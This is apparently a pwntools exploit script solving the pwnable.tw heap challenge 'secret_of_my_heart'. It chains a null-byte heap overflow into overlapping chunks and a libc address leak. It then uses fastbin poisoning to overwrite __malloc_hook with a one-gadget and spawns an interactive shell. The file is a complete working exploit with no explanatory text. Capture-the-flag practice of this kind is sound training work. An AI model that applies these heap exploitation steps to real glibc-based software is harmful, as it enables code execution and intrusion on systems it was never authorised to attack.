from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
context.log_level    = "debug"

def choice(io,ch):
    io.sendlineafter(b"Your choice :", str(ch).encode())

def add(io, size, name, content):
    choice(io,1)
    io.sendlineafter(b"Size of heart : ", str(size).encode())
    io.sendafter(b"Name of heart :", name)
    io.sendafter(b"secret of my heart :", content)

def delete(io,idx):
    choice(io,3)
    io.sendlineafter(b"Index :", str(idx).encode())
    # io.recvuntil("Done")

def show(io,idx):
    choice(io,2)
    io.sendlineafter(b"Index :", str(idx).encode())
    io.recvuntil(b"Secret : ")
    res = io.recvline().strip(b"\n")
    # print(res)
    return res

io = process("./secret_of_my_heart")
# io = remote("chall.pwnable.tw",10302)
add(io,0x10, b"null",b"null")   # idx=0
add(io, 0xff, b"a", b"a")   # idx=1
add(io, 0x18, b"c", b"c")   # idx=2
add(io, 0xff, b"b", b"b"*0xf0 + p64(0x100) + p64(0x21))   # idx=3
add(io, 0x30, b"a", p64(0x21) + p64(0x31))   # idx=4
delete(io,1)
delete(io,2)
payload = b"a" * 0x10 + p64(0x20+0x110) 
add(io,0x18,b"re",payload)  # idx=1
delete(io,1)
delete(io,3)

add(io,0x10,b"1",b"1")      # idx=1
add(io,0xff,b"1",b"1")      # idx=2
add(io,0xff,b"1",b"1")      # idx=3
delete(io,3)

# leak libc
libc = ELF("./libc_64.so.6")
libc.address = u64(show(io,1).ljust(8,b"\0")) - 0x3c3b78
success(f"leaked libc at {hex(libc.address)}")
# delete(io,1)
delete(io,2)

add(io,0xf0,b"1",b"1")      # idx=2
add(io,0x80,b"1",p64(0x20)+p64(0x71)+b"a"*0x60+p64(0x71)+p64(0x101))    # idx=3

delete(io,1)                
delete(io,3)

add(io,0x80,b"1",p64(0x20)+p64(0x71)+p64(libc.symbols["__malloc_hook"]-0x23))    # idx=1

add(io,0x60,b"a",b"a")  # idx=3
delete(io,1) 
delete(io,2)
gadget = libc.address + 0xef6c4
add(io,0xff,b"a",b"a")
add(io,0x20,b"a",b"a")
add(io,0x60,b'1',b"a"*(0x13) + p64(gadget)) # idx=6
# gdb.attach(io )
delete(io,2)
delete(io,3)

# gdb.attach(io )
io.interactive()

